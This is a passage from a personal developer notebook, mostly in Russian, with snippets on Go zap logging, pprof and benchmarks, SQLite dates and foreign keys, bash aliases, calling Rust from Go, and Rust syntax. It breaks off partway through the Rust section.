  loggerProdWithSugar.Infof("info: %v", testErr)
  // {"level":"info","ts":1618499815.713104,"caller":"experiment/zaplogger.go:44","msg":"info: test"}
  loggerProdWithSugar.Infow("info", "key", "value")
  // {"level":"info","ts":1618499815.713104,"caller":"experiment/zaplogger.go:45","msg":"info","key":"value"}

  cfg := zap.NewProductionEncoderConfig()
  encJson := zapcore.NewJSONEncoder(cfg)
  file, _ := os.Create("D:\\projects\\go\\experiment\\test.log")
  ws := zapcore.AddSync(file)
  enab := zapcore.DebugLevel
  core := zapcore.NewCore(encJson, ws, enab)
  loggerWithCore := zap.New(core)
  loggerWithCore.Info("text", zap.Error(testErr))
  // in file: {"level":"info","ts":1618500829.6932197,"msg":"text","error":"test"}
  loggerWithCoreAndSugar := loggerWithCore.Sugar()
  loggerWithCoreAndSugar.Infof("text: %v", testErr)
  // in file: {"level":"info","ts":1618500829.6932197,"msg":"text: test"}

  encConsole := zapcore.NewConsoleEncoder(cfg)
  coreConsole := zapcore.NewCore(encConsole, ws, enab)
  loggerWithCoreConsole := zap.New(coreConsole)
  loggerWithCoreConsole.Info("text", zap.Error(testErr))
  // in file: 1.6185008296932197e+09  info  text  {"error": "test"}
  loggerWithCoreConsoleAndSugar := loggerWithCoreConsole.Sugar()
  loggerWithCoreConsoleAndSugar.Infof("text: %v", testErr)
  // in file: 1.6185008296932197e+09  info  text: test

  cfgTime := zap.NewProductionEncoderConfig()
  cfgTime.EncodeTime = zapcore.ISO8601TimeEncoder
  cfgTime.EncodeLevel = zapcore.CapitalLevelEncoder
  encConsoleTime := zapcore.NewConsoleEncoder(cfgTime)
  coreConsoleTime := zapcore.NewCore(encConsoleTime, ws, enab)
  loggerWithCoreConsoleTime := zap.New(coreConsoleTime)
  loggerWithCoreConsoleTime.Info("text", zap.Error(testErr))
  // in file: 2021-04-15T18:39:35.129+0300  INFO  text  {"error": "test"}
  loggerWithCoreConsoleTimeAndSugar := loggerWithCoreConsoleTime.Sugar()
  loggerWithCoreConsoleTimeAndSugar.Infof("text: %v", testErr)
  // in file: 2021-04-15T18:40:13.211+0300  INFO  text: test

  loggerWithCoreConsoleTimeAndCaller := zap.New(coreConsoleTime, zap.AddCaller())
  loggerWithCoreConsoleTimeAndCaller.Info("text", zap.Error(testErr))
  // in file: 2021-04-15T18:41:57.581+0300  INFO  experiment/zaplogger.go:86  text  {"error": "test"}

  rotateLogger := &lumberjack.Logger{
    Filename: "D:\\projects\\go\\experiment\\test.log",
    MaxSize: 10,  // maximum size in megabytes of the log file before it gets rotated
    MaxBackups: 5, // maximum number of old log files to retain
    MaxAge: 30, // maximum number of days to retain old log files
    Compress: false, // rotated log files should be compressed using gzip
  }
  wsRotate := zapcore.AddSync(rotateLogger)
  coreConsoleTimeRotate := zapcore.NewCore(encConsoleTime, wsRotate, enab)
  loggerWithCoreConsoleTimeAndCallerRotate := zap.New(coreConsoleTimeRotate, zap.AddCaller())
  loggerWithCoreConsoleTimeAndCallerRotate.Info("text", zap.Error(testErr))
  // in file: 2021-04-15T18:53:57.853+0300  INFO  experiment/zaplogger.go:100  text  {"error": "test"}

  cfgCustom := zap.Config{
    Encoding: "json",
    Level: zap.NewAtomicLevelAt(zap.DebugLevel),
    OutputPaths: []string{"stdout"},
    EncoderConfig: zapcore.EncoderConfig{
      MessageKey: "message",
      LevelKey:    "level",
      EncodeLevel: zapcore.CapitalLevelEncoder,
      TimeKey:    "time",
      EncodeTime: zapcore.ISO8601TimeEncoder,
      CallerKey:    "caller",
      EncodeCaller: zapcore.FullCallerEncoder,
    },
  }
  loggerCfgCustom, _ := cfgCustom.Build()
  loggerCfgCustom.Info("custom")
  // {"level":"INFO","time":"2021-04-15T21:29:12.729+0300","caller":"_/D_/projects/go/experiment/zaplogger.go:118","message":"custom"}

  wsFileAndConsole := zapcore.NewMultiWriteSyncer(zapcore.AddSync(os.Stdout), wsRotate)
  coreFileAndConsole := zapcore.NewCore(encConsoleTime, wsFileAndConsole, enab)
  loggerWithCoreFileAndConsole := zap.New(coreFileAndConsole, zap.AddCaller()). // add hook
    WithOptions(zap.Hooks(func(entry zapcore.Entry) error {
    fmt.Println("test hooks test hooks")
    return nil
  }))
  loggerWithCoreFileAndConsole.Info("file and console")
  // in file: 2021-04-15T21:29:12.729+0300  INFO  experiment/zaplogger.go:123  file and console
  // 2021-04-15T21:29:12.729+0300  INFO  experiment/zaplogger.go:123  file and console

  zap.ReplaceGlobals(loggerWithCoreFileAndConsole) // теперь можно вызывать из любого места zap.L()
  fZap()
}

func fZap() {
  zap.L().Error("global", zap.Error(testErr))
  // in file: 2021-04-15T21:29:12.729+0300  ERROR  experiment/zaplogger.go:130  global  {"error": "test"}
  // 2021-04-15T21:29:12.729+0300  ERROR  experiment/zaplogger.go:130  global  {"error": "test"}
}
==================================================
Linux uniq
(tags: linux uniq)
---

cat file.txt | uniq -d
-u (--unique) — выводит исключительно те строки, у которых нет повторов
-d (--repeated) — если какая-либо строка повторяется несколько раз, она будет выведена лишь единожды.
-D — выводит только повторяющиеся строки.
==================================================
Update golang version on linux
(tags: update golang version linux)
---

cd /home/dim
wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf /home/dim/go1.16.3.linux-amd64.tar.gz
echo $PATH | grep "/usr/local/go/bin"
// если нет, то
// export PATH=$PATH:/usr/local/go/bin
// source .bashrc
В GoLand: File -> Invalidate Caches
==================================================
Golang embed template
(tags: golang embed template)
---

https://github.com/philippta/web-frontend-demo

// main.go
package main

import (
  "net/http"
  "stepik/html"
)

func main() {
  http.HandleFunc("/dashboard", dashboard)
  http.HandleFunc("/profile/show", profileShow)
  http.ListenAndServe(":8080", nil)
}
func dashboard(w http.ResponseWriter, r *http.Request) {
  p := html.DashboardParams{
    Title:   "Dashboard",
    Message: "Hello from dashboard",
  }
  html.Dashboard(w, p)
}
func profileShow(w http.ResponseWriter, r *http.Request) {
  p := html.ProfileShowParams{
    Title:   "Profile Show",
    Message: "Hello from profile show",
  }
  html.ProfileShow(w, p)
}

// html/html.go
package html

import (
  "embed"
  "io"
  "text/template"
)

//go:embed *
var files embed.FS
var (
  dashboard   = parse("dashboard.html")
  profileShow = parse("profile/show.html")
)
type DashboardParams struct {
  Title   string
  Message string
}
func Dashboard(w io.Writer, p DashboardParams) error {
  return dashboard.Execute(w, p)
}
type ProfileShowParams struct {
  Title   string
  Message string
}
func ProfileShow(w io.Writer, p ProfileShowParams) error {
  return profileShow.Execute(w, p)
}
func parse(file string) *template.Template {
  return template.Must(
    template.New("layout.html").ParseFS(files, "layout.html", file))
}

// html/layout.html
<!DOCTYPE html>
<html>
  <head>
    <title>{{.Title}}</title>
  </head>
  <body>
    {{block "content" .}}{{end}}
  </body>
</html>

// html.dashboard.html
{{define "content"}}
<p>
  Dashboard:
  {{.Message}}
</p>
{{end}}

//html/profile/show.html
{{define "content"}}
<p>
  Profile Show:
  {{.Message}}
</p>
{{end}}
==================================================
Sqlite date
(tags: sqlite date)
---

https://codernotes.ru/articles/bazy-dannyh-t-sql/funkcii-daty-i-vremeni-v-sqlite.html

-- Определить текущую дату.
SELECT date('now');
-- Вычислить последний день текущего месяца.
SELECT date('now','start of month','+1 month','-1 day');
-- Вычислить дату и время имея на входе метку времени unix 1092941466.
SELECT datetime(1092941466, 'unixepoch');
-- Вычислить дату и время имея на входе метку времени unix 1092941466, и перевести его в локальное время.
SELECT datetime(1092941466, 'unixepoch', 'localtime');
-- Получить текущую unix метку времени.
SELECT strftime('%s','now');
-- Вычислить количество дней с момента подписания Декларации Независимости США.
SELECT julianday('now') - julianday('1776-07-04');
-- Вычислить количество секунд с определенного момента в 2004 году:
SELECT strftime('%s','now') - strftime('%s','2004-01-01 02:34:56');
-- Вычислить дату первого вторника октября текущего года.
SELECT date('now','start of year','+9 months','weekday 2');
-- Вычислить время с эпохи unix в секундах (аналогично strftime('%s','now') не считая дробной части):
SELECT (julianday('now') - 2440587.5)*86400.0;

date(timestring, modifier, modifier, ...)
time(timestring, modifier, modifier, ...)
datetime(timestring, modifier, modifier, ...)
julianday(timestring, modifier, modifier, ...)
strftime(format, timestring, modifier, modifier, ...)
-- format:
%d  День месяца: 00
%f  Доли секунды: SS.SSS
%H  час: 00-24
%j  день года: 001-366
%J  Юлианский день
%m  месяц: 01-12
%M  минуты: 00-59
%s  количество секунд с 1970-01-01 (unix timestamp)
%S  секунды: 00-59
%w  день недели 0-6 где Воскресенье==0
%W  неделя года: 00-53
%Y  год: 0000-9999
%%  %

date(...) = strftime('%Y-%m-%d', ...)
time(...) = strftime('%H:%M:%S', ...)
datetime(...) = strftime('%Y-%m-%d %H:%M:%S', ...)
julianday(...) = strftime('%J', ...)

-- in table must be:
YYYY-MM-DD
YYYY-MM-DD HH:MM
YYYY-MM-DD HH:MM:SS
YYYY-MM-DD HH:MM:SS.SSS
YYYY-MM-DDTHH:MM
YYYY-MM-DDTHH:MM:SS
YYYY-MM-DDTHH:MM:SS.SSS
HH:MM
HH:MM:SS
HH:MM:SS.SSS
now
DDDDDDDDDD

-- modifier:
NNN days
NNN hours
NNN minutes
NNN.NNNN seconds
NNN months
NNN years
start of month
start of year
start of day
weekday N
unixepoch
localtime
utc
==================================================
Sqlite foreigen keys
(tags: sqlite foreigen key)
---

PRAGMA foreign_keys=on;

CREATE TABLE books(
  Id INTEGER PRIMARY KEY,
  title TEXT NOT NULL,
  count_page INTEGER NOT NULL CHECK (count_page >0),
  price REAL CHECK (price >0)
);

CREATE TABLE auth(
  id INTEGER PRIMARY KEY,
  name TEXT NOT NULL,
  age INTEGER  CHECK (age >16)
);

CREATE TABLE auth_book (
  auth_id INTEGER NOT NULL,
  books_id INTEGER NOT NULL,
  FOREIGN KEY (auth_id) REFERENCES auth(id)
  FOREIGN KEY (books_id) REFERENCES books(id)
);
==================================================
Golang init
(tags: redis syntax)
---

main
import pkg1
  pkg1
  import pkg2
    pkg2
    const
    var
    init()
  const
  var
  init()
const
var
init()
main()
==================================================
DeepEqual vs google cmp
(tags: deepequal vs cmp compare)
---

https://dev.to/mariocarrion/go-package-for-equality-github-com-google-go-cmp-f8i

package main

import (
  "fmt"
  "github.com/google/go-cmp/cmp"
  "github.com/google/go-cmp/cmp/cmpopts"
  "reflect"
  "strings"
)

func main() {
  a := []int{1,2,3}
  b := []int{1,3,2}
  fmt.Println(reflect.DeepEqual(a, b)) // false
  fmt.Println(cmp.Equal(a, b)) // false
  opt := cmpopts.SortSlices(func(a, b int) bool {
    return a < b
  })
  fmt.Println(cmp.Equal(a, b, opt)) // true

  c := map[int]string{1: "aa", 2: "bb", 3: "cc"}
  d := map[int]string{1: "aa", 3: "cc", 2: "bb"}
  fmt.Println(reflect.DeepEqual(c, d)) // true
  fmt.Println(cmp.Equal(c, d)) // true
  opt2 := cmpopts.SortMaps(func(c, d int) bool {
    return c < d
  })
  fmt.Println(cmp.Equal(c, d, opt2)) // true

  e := map[int]Message{1: "aa", 2: "bb", 3: "cc"}
  f := map[int]Message{1: "aa", 3: "cc", 2: "BB"}
  fmt.Println(reflect.DeepEqual(e, f)) // false
  fmt.Println(cmp.Equal(e, f)) // true

  g := Alert{Message: "aa", code: 1}
  h := Alert{Message: "aa", code: 2}
  fmt.Println(reflect.DeepEqual(g, h)) // false
  //fmt.Println(cmp.Equal(g, h)) // panic
  fmt.Println(cmp.Equal(g, h, cmpopts.IgnoreUnexported(Alert{}))) // true

  g1 := &Alert{Message: "aa", code: 1}
  h1 := &Alert{Message: "aa", code: 2}
  fmt.Println(reflect.DeepEqual(g1, h1)) // false
  //fmt.Println(cmp.Equal(g1, h1)) // panic
  fmt.Println(cmp.Equal(g1, h1, cmpopts.IgnoreUnexported(Alert{}))) // true
}

type Message string

func (m Message) Equal(b Message) bool {
  return strings.ToLower(string(m)) == strings.ToLower(string(b))
}

type Alert struct {
  Message Message
  code    int
}
==================================================
Sqlboiler
(tags: sqlboiler)
---

https://github.com/volatiletech/sqlboiler

// for go 1.15 (for above use go install)
GO111MODULE=on go get -u -t github.com/volatiletech/sqlboiler/v4
GO111MODULE=on go get github.com/volatiletech/sqlboiler/v4/drivers/sqlboiler-psql
go get github.com/volatiletech/sqlboiler/v4
go get github.com/volatiletech/null/v8
// in sqlboiler.toml file:
output   = "my_models"
wipe     = true
no-tests = true

[psql]
  dbname = "dbname"
  host   = "localhost"
  port   = 5432
  user   = "dbusername"
  pass   = "dbpassword"
  schema = "myschema"
  blacklist = ["migrations", "other"]
// wipe - remove "my_models" folder
// in terminal:
sqlboiler psql
// check "my_models" folder ("models" on default) in your project

// print query
ctx = boil.WithDebug(ctx, true)
==================================================
Golang pprof
(tags: golang pprof)
---

package main

import (
  "fmt"
  "io"
  "net/http"
  _ "net/http/pprof"
  "time"
)

func main() {
  Handler := func(w http.ResponseWriter, req *http.Request){
    sleep(5)
    sleep(10)
    io.WriteString(w, "for test")
  }
  http.HandleFunc("/", Handler)
  http.ListenAndServe(":1234", nil)
}

func sleep(sleepTime int) {
  time.Sleep(time.Duration(sleepTime) * time.Millisecond)
  fmt.Println("slept for", sleepTime, "ms")
}

// start Apache Bensh for generate testing requests
// 5000 numbers on 10 threads
ab -n 5000 -c 10 http://localhost:1234/
// get snap of profile
curl -s "localhost:1234/debug/pprof/profile?seconds=10" > out.dump
go tool pprof out.dump
web
// on error: Running Firefox as root in a regular user's session is not supported
// exit
// su - username
// go tool pprof out.dump
// on error: no DISPLAY environment variable specified
// exit
// export DISPLAY=:0
// go tool pprof out.dump
web sleep

//bash script
#!/usr/bin/env bash

curl http://localhost:1234/debug/pprof/heap -o mem.out
curl http://localhost:1234/debug/pprof/allocs -o memallocs.out
curl http://localhost:1234/debug/pprof/goroutine -o goroutine.out
curl http://localhost:1234/debug/pprof/mutex -o mutex.out
curl http://localhost:1234/debug/pprof/profile?seconds=5 -o cpu.out
curl http://localhost:1234/debug/pprof/trace?seconds=10 -o trace.out
==================================================
Golang benchmark
(tags: golang benchmark)
---

// main.go
package main

import "time"

func main() {

}
func sleep1(sleepTime int) {
  time.Sleep(time.Duration(sleepTime) * time.Millisecond)
}
func sleep2(sleepTime int) {
  <-time.After(time.Duration(sleepTime) * time.Millisecond)
}

// main_test.go
package main

import "testing"

func Benchmark_sleep1(b *testing.B) {
  for i := 0; i < b.N; i++ {
    sleep1(10)
  }
}
func Benchmark_sleep2(b *testing.B) {
  for i := 0; i < b.N; i++ {
    sleep2(10)
  }
}

go test -bench=. -benchmem -cpuprofile=cpu.out -memprofile=mem.out
//Benchmark_sleep1-4  100  11703997 ns/op  166 B/op  0 allocs/op
//Benchmark_sleep2-4  100  11401463 ns/op  200 B/op  3 allocs/op
go tool pprof cpu.out
web
// see pprof tag

go test -bench=Benchmark_sleep1 -benchmem -cpuprofile=sleep1_cpu.out -memprofile=sleep1_mem.out
go test -bench=Benchmark_sleep2 -benchmem -cpuprofile=sleep2_cpu.out -memprofile=sleep2_mem.out
go tool pprof -base sleep1_cpu.out sleep2_cpu.out
top10 -cum
// if "cum -20ms" then sleep2 better than sleep1
go tool pprof -base sleep1_mem.out sleep2_mem.out
top10 -cum
// if "cum 1696.33kB" then sleep2 worse than sleep1
==================================================
Golang project structure
(tags: golang project structure)
---

myapp
  cmd // для сборки различных приложений с той же кодовой базой
  firstapp
    main.go
  secondapp
    main.go
  internal // бизнеслогика данного проекта, не экспортируется в другие проекты
  pkg // методы с открытым апи, можно экспортировать в другие проекты
  deployments // docker-compose для инфраструктуры
  scripts // различные скрипты
  tools // инструменты или мини-программы использующие данную кодовую базу
  infrastructure // все что касается взаимодействия с инфраструктурой
  init // содержит начальные конфигурации
  transport // все что касается транспорта grps, http и др
  domain // здесь описаны доменные сущности
  config // структура конфигурации приложения
  endpoint // содержит endpoint, response, request, middleware для go-kit
  plugins // скомпилированные .so плагины (код их в internal)
==================================================
Linux alias
(tags: linux alias)
---

alias # список алиасов
alias c='clear' # очистить вывод терминала
unalias c # удалить алиас
# можно добавить в ~/.bashrc чтоб каждый раз не создавать

alias ll='ls -la'
alias cd..='cd ..'
alias ..='cd ..'
alias ...='cd ../../../'
alias ....='cd ../../../../'
alias .....='cd ../../../../'
alias mkdir='mkdir -pv' # Создавать дерево каталогов, если оно не существует
alias diff='colordiff' # Делаем вывод diff цветным
alias h='history'
alias j='jobs -l'
alias path='echo -e ${PATH//:/\\n}'
alias now='date +"%T"'
alias nowtime=now
alias nowdate='date +"%d-%m-%Y"'
alias ping='ping -c 5'
alias ports='netstat -tulanp' # Открытые порты
alias iptlist='sudo /sbin/iptables -L -n -v --line-numbers'
alias iptlistin='sudo /sbin/iptables -L INPUT -n -v --line-numbers'
alias iptlistout='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'
alias iptlistfw='sudo /sbin/iptables -L FORWARD -n -v --line-numbers'
alias firewall=iptlist
alias meminfo='free -m -l -t' # Использование памяти
alias psmem='ps auxf | sort -nr -k 4' # Показать процессы потребляющие больше всего памяти
alias psmem10='ps auxf | sort -nr -k 4 | head -10'
alias pscpu='ps auxf | sort -nr -k 3' # Показать процессы использующие процессор
alias pscpu10='ps auxf | sort -nr -k 3 | head -10'
alias cpuinfo='lscpu' # Информация о процессоре
alias gpumeminfo='grep -i --color memory /var/log/Xorg.0.log' # Посмотреть память видеокарты
==================================================
Blockchain
(tags: blockchain)
---

https://github.com/tensor-programming/golang-blockchain

package main

import (
  "bytes"
  "crypto/sha256"
  "fmt"
)

type BlockChain struct {
  blocks []*Block
}
type Block struct {
  Hash     []byte
  Data     []byte
  PrevHash []byte
}
func (b *Block) DeriveHash() {
  info := bytes.Join([][]byte{b.Data, b.PrevHash}, []byte{})
  hash := sha256.Sum256(info)
  b.Hash = hash[:]
}
func CreateBlock(data string, prevHash []byte) *Block {
  block := &Block{[]byte{}, []byte(data), prevHash}
  block.DeriveHash()
  return block
}
func (chain *BlockChain) AddBlock(data string) {
  prevBlock := chain.blocks[len(chain.blocks)-1]
  new := CreateBlock(data, prevBlock.Hash)
  chain.blocks = append(chain.blocks, new)
}
func Genesis() *Block {
  return CreateBlock("Genesis", []byte{})
}
func InitBlockChain() *BlockChain {
  return &BlockChain{[]*Block{Genesis()}}
}

func main() {
  chain := InitBlockChain()

  chain.AddBlock("First Block after Genesis")
  chain.AddBlock("Second Block after Genesis")
  chain.AddBlock("Third Block after Genesis")

  for _, block := range chain.blocks {
    fmt.Printf("Previous Hash: %x\n", block.PrevHash)
    fmt.Printf("Data in Block: %s\n", block.Data)
    fmt.Printf("Hash: %x\n", block.Hash)
  }
}
==================================================
Turn off gc
(tags: off cg golang)
---

func f() {
  defer debug.SetGCPercent(debug.SetGCPercent(-1))
  // do something
}
==================================================
Call rust from golang
(tags: call rust golang)
---

https://github.com/mediremi/rust-plus-golang

// curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
// export PATH=$PATH:/root/.cargo/bin
// cd ~
// source .bashrc

// main.go
package main

/*
#cgo LDFLAGS: -L./lib -lhello
#include "./lib/hello.h"
*/
import "C"

func main() {
  C.hello(C.CString("John Smith"))
}

// lib/hello.h
void hello(char *name);

// lib/hello/Cargo.toml
[package]
name = "hello"
version = "0.1.0"

[lib]
crate-type = ["cdylib"]

[dependencies]
libc = "0.2.2"

// lib/hello/src/lib.rs
extern crate libc;
use std::ffi::CStr;

#[no_mangle]
pub extern "C" fn hello(name: *const libc::c_char) {
    let buf_name = unsafe { CStr::from_ptr(name).to_bytes() };
    let str_name = String::from_utf8(buf_name.to_vec()).unwrap();
    println!("Hello {}!", str_name);
}

// Makefile
ROOT_DIR := $(dir $(realpath $(lastword $(MAKEFILE_LIST))))

build:
  cd lib/hello && cargo build --release
  cp lib/hello/target/release/libhello.so lib/
  go build -ldflags="-r $(ROOT_DIR)lib" main.go

run: build
  ./main

// make
// ./main
==================================================
Rust syntax
(tags: rust syntax)
---

https://metanit.com/rust/tutorial

use std::collections::HashMap;
use my_module::inner_module::test;

const TEXT: &str = "constanta";
// let b: &str = "not compiled";

fn main() {
  // let if
  let condition = true;
  let number = if condition { 4 } else { 5 };
  println!("number = {}", number);  // number = 4

  // match
  let num = 3;
  let result = match num {
    1 => "один",
    2 => "два",
    3 => "три",
    _ => "непонятно"
  };
  println!("result = {}", result);  // result = три

  // loop
  let mut n = 1;
  let result = loop {
    n = n + 1;
    if n == 10 {
      break n;
    }
  };
  println!("result = {}", result);  // result = 10
  // while
  let mut n = 1;
  while n < 10 {
    n = n + 1;
  }
  println!("n = {}", n);  // n = 10
  // for
  for num in 1..6 {
    println!("num = {}", num);
  }

  // function
  hello(); // Hello Rust
  println!("sum = {}", sum(2, 3)); // sum = 5

  // constant
  const PI: f32 = 3.14; // can not be changed
  println!("PI = {}", PI);

  // anonymous function
  let sum = |a: i32, b: i32| -> i32{
    a + b
  };
  let sum_of_5_and_4 = sum(5, 4);
  println!("Сумма 5 и 4 равна: {}", sum_of_5_and_4); //Сумма 5 и 4 равна: 9
  let sum = |a, b| a + b; //without types
  let sum_of_int = sum(5, 4);
  // let sum_of_float = sum(5.3, 4.2); //error: expected integer, found floating-point number

  // closure
  let message = "Hello Rust!";
  let hello = || {
    println!("{}", message); // using environment variable
  };
  hello(); // Hello Rust!

  // tuple
  let user = ("Tom", 36, 1.78);
  let user: (&str, u8, f32) = ("Tom", 36, 1.78);
  println!("Имя: {}", user.0); // Имя: Tom
  // mutable tuple
  let mut user = ("Tom", 32, 1.65);
  user.0 = "Bob";
  println!("Имя: {}", user.0); // Имя: Bob
  // decomposition of tuple
  let (name, _, height) = user;
  println!("Имя: {}", name); // Имя: Bob

  // array
  let numbers: [i32; 7] = [1, 2, 3, 5, 8, 13, 21];
  let numbers = [1, 2, 3, 5, 8, 13, 21];
  println!("{}", numbers[0]);   // 1
  // mutable array
  let mut users = ["Tom", "Bob", "Sam"];
  users[0] = "Alice";
  println!("{}", users[0]);   // Alice
  // iterate array
  for user in users.iter() {
    print!("{} ", user);
  }
  // array with default
  let numbers: [i32; 5] = [2; 5]; // 2 2 2 2 2

  // struct
  let tom = Person {
    name: "Tom".to_string(),
    age: 36,
    height: 1.78,
  };
  println!("name = {}", tom.name); // name = Tom
  let bob = Person {
    name: "Bob".to_string(),
    ..tom
  };
  println!("name = {}", bob.name); // name = Bob
  // decomposition of struct
  let Person { name: username, age: userage, height: _ } = tom;
  println!("name = {}  age = {}", username, userage); // name = Tom  age = 36

  // tuple structs
  let start = Point(2, 4);
  println!("Начало: (x={}, y={})", start.0, start.1); // Начало: (x=2, y=4)
  let end = Point(2, 7);
  let dist = Distance(start, end);
  println!("Начало: ({},{})", dist.0.0, dist.0.1); // Начало: (2,4)

  // enums
  let op = OperationType::Subtract;
  match op {
    OperationType::Add => println!("Сложение"),
    OperationType::Subtract => println!("Вычитание"),
  }

  // enums with types
  let dt = DayTime::Morning("Доброе утро".to_string());
  match dt {
    DayTime::Morning(_) => println!("Добрый день!"),
    DayTime::Evening(message) => println!("{}", message),
  }

  // range
  let numbers = 1..9;
  for num in numbers {
    print!("{} ", num); // 1 2 3 4 5 6 7 8
  }
  let numbers = std::ops::Range { start: 1, end: 9 };
  for num in numbers {
    print!("{} ", num);     // 1 2 3 4 5 6 7 8
  }
  let numbers = 1..=9;    // include 9
  for num in numbers {
    print!("{} ", num);     // 1 2 3 4 5 6 7 8 9
  }
  let numbers = [1, 2, 3, 4, 5, 6, 7, 8];
  for num in numbers[1..5].iter() {
    print!("{} ", num)              // 2 3 4 5
  }

  // if let
  let user = ("Tom", 21);
  if let ("Tom", age) = user {
    println!("age: {}", age); // 21
  }
  let morning = DayTime::Morning("Доброе утро".to_string());
  if let DayTime::Morning(message) = morning {
    println!("morning message: {}", message); // morning message: Доброе утро
  }
  let tom = Person {
    name: "Tom".to_string(),
    age: 33,
    height: 1.70,
  };
  let username = "Tom".to_string();
  if let Person { name: username, age: 33, height: _ } = tom {
    println!("Это Том");
  }

  // ownership
  let s1 = "hello".to_string();  // s1 - владелец строки "hello"
  println!("s1: {}", s1);
  let s2 = s1;  // меняем владельца строки на s2
  // println!("s1: {}", s1);  // !Ошибка - s1 теперь нельзя использовать

  let s1 = "hello".to_string();  // s1 - владелец строки "hello"
  println!("s1: {}", s1);
  display_message(s1);
  // println!("s1: {}", s1);  // !Ошибка - переменная s1 неинициализирована

  // reference
  let s1 = "hello".to_string();  // s1 - владелец строки "hello"
  let s2 = &s1;  // s2 получает ссылку на значение переменной s1
  println!("s1: {}", s1);  // s1: hello
  display_message_ref(&s1);

  // mutable reference
  let mut message = "hello".to_string();
  change_message(&mut message);
  let mut s1 = "hello".to_string();
  // let s2 = &mut s1;
  // let s3 = &mut s1; // error: second mutable borrow occurs here (только одна мутабельная ссылка может быть)
  {
    let s3 = &mut s1;
  }
  let s2 = &mut s1;
  s2.push('!');
  println!("{}", s1); // hello!

  let mut s1 = "hello".to_string();
  // let s2 = &mut s1;    // если определить здесь, будет ошибка
  {
    let s3 = &mut s1;
    s3.push('?');
  }
  let s2 = &mut s1;
  s2.push('!');
  println!("{}", s1); // hello?!

  // slice
  let numbers = [1, 2, 3, 4, 5, 6, 7, 8];
  let slice = &numbers[1..5];  // получим слайс
  println!("slice[0]={}", slice[0]);  // выведем первый элемент слайса
  for num in slice {
    print!("{} ", num)  // 2 3 4 5
  }
  // numbers[..] эквивалентно [1, 2, 3, 4, 5, 6, 7, 8]
  // numbers[..3] эквивалентно [1, 2, 3 ]
  // numbers[..=3] эквивалентно [1, 2, 3, 4]
  // numbers[1..] эквивалентно [2, 3, 4, 5, 6, 7, 8]
  // numbers[1..3] эквивалентно [2, 3]
  // numbers[1..=3] эквивалентно [2, 3, 4]
  let mut numbers = [1, 2, 3, 4, 5, 6, 7, 8];
  let slice = &mut numbers[1..5]; // получим слайс
  slice[0] = 81; // изменим первый элемент слайса
  println!("slice[0]={}", slice[0]); // slice[0]=81

  // method
  let tom = Person {
    name: "Tom".to_string(),
    age: 36,
    height: 156.0,
  };
  tom.display(); // Name: Tom  Age: 36
  tom.is_older(&bob);
  let mut tom = Person { name: "Tom".to_string(), age: 36, height: 156.0 };
  tom.change_age(42);
  tom.display(); // Name: Tom  Age: 42

  // associated function
  let tom = Person::create("Tom", 36);
  tom.display(); // Name: Tom  Age: 36

  // trait
  tom.print(); // Person Tom; age: 36
  println!("{}", tom.preview()); // [Предпросмотр] Person Tom; age: 36
  tom.print_something(); // something...
  display_printable(&tom); // Person Tom; age: 36
  let printable = create_printable();
  display_printable(&printable); // Person Bob; age: 23

  // generics
  let bob = PersonGen { id: String::from("fhe34u847"), name: "Bob".to_string(), place: 3 };
  println!("id: {}  name: {}", bob.id, bob.name); // id: fhe34u847  name: Bob
  let morning = DayTimeGen::Morning("Доброе утро".to_string());
  let evening = DayTimeGen::Evening(16);
  let result1 = receive(3);
  println!("{}", result1);  // 3
  let result2 = receive("hello");
  println!("{}", result2);  // hello
  println!("{}", bob.get_id());  // fhe34u847
  let rob = PersonGen { id: 2, name: "Rob".to_string(), place: 4 };
  println!("{}", rob.get_id_i32()); //2
  let tom = Person { name: "Tom".to_string(), age: 36, height: 156.0 };
  display_printable_gen(&tom); // Person Tom; age: 36
  display_printable_gen_where(&tom); // Person Tom; age: 36
  print_send(&tom); //Person Tom; age: 36 Сообщение отправлено

  // lifetime
  let message = get_message();
  println!("message: {}", message); // hello
  println!("message: {}", get_message_static()); // hello

  // vector
  let v: Vec<i32> = Vec::new(); // empty
  let v = vec![1, 2, 3];
  let v: Vec<i32> = vec![]; // empty
  let v = vec![5; 3]; // vec![5, 5, 5];
  let mut users = Vec::new();
  users.push("Tom");
  println!("1. {}", users[0]);    // 1. Tom
  users[0] = "Alice";
  println!("1. {}", users[0]);    // 1. Alice
  users.push("Bob");
  for user in &users { // если просто users, то это передаст владение вектором циклу for и users нельзя будет больше использовать
    println!("{}", user);
  }
  println!("length: {}", users.len());    // length: 2
  let removed_element = users.pop();   // удаляем элемент из конца, возвращается Option<T>
  println!("Удаленный элемент: {}", removed_element.unwrap());    // Удаленный элемент: Bob

  // string
  let message = String::new(); // empty
  let message = String::from("Hello");
  let message = "hello".to_string();
  println!("length: {}", message.chars().count()); // 5
  let mut message = String::from("hello");
  message.push('?');
  println!("Message: {}", message); // Message: hello?
  message.push_str(" Rust");
  println!("Message: {}", message); // Message: hello? Rust
  let hello = String::from("hello ");
  let rust = String::from("Rust");
  let message = hello + &rust;
  println!("Message: {}", message); // Message: hello Rust
  // println!("{}", hello);   // !Ошибка владение данными перешло от переменной hello к message
  let hello = String::from("hello ");
  let rust = String::from("Rust");
  let message = format!("{} {} on Metanit.com", hello, rust);
  println!("{}", message);    // hello Rust on Metanit.com

  // hashmap
  let mut countries: HashMap<String, i32> = HashMap::new();
  countries.insert(String::from("Германия"), 82);
  countries.insert(String::from("Франция"), 67);
  println!("Число элементов: {}", countries.len()); // Число элементов: 2
  let mut countries = HashMap::new();
  let population = 82;
  let country = String::from("Германия");
  countries.insert(country, population);
  println!("population: {} млн. чел.", population); // population можно использовать
  // println!("country: {}", country); // ! Ошибка country нельзя использовать
  // countries.insert(&country, population); // так мы не передадим владение
  let population = countries["Германия"];
  println!("Germany : {}", population); // Germany : 82
  // let population = countries["France"]; // error: no entry found for key
  let population = countries.get("France");
  if population == Option::None {
    println!("Элемента с ключом France не существует");
  } else {
    println!("France : {}", population.unwrap());
  }
  for (key, value) in &countries {
    println!("{}: {}", key, value);
  }
  if countries.contains_key("France") {
    println!("{}", countries["France"]);
  }
  let mut countries = HashMap::new();
  countries.insert(String::from("Germany"), 82);
  countries.entry(String::from("France")).or_insert(67);
  countries.entry(String::from("Germany")).or_insert(250);
  println!("{}", countries["Germany"]);       // 82
  println!("{}", countries["France"]);        // 67
  countries.remove("Germany");
